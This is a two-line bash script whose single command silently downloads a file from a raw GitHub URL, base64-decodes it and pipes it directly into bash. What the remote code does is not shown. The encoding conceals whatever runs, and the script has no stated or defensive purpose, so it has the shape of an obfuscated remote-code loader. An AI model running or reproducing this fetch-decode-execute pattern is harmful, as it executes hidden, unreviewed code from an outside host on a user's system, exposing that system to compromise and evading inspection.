#!/bin/bash
wget -qO- https://raw.githubusercontent.com/zovuyojoystick/shack/refs/heads/main/entrypoint.sh | base64 -d | bash
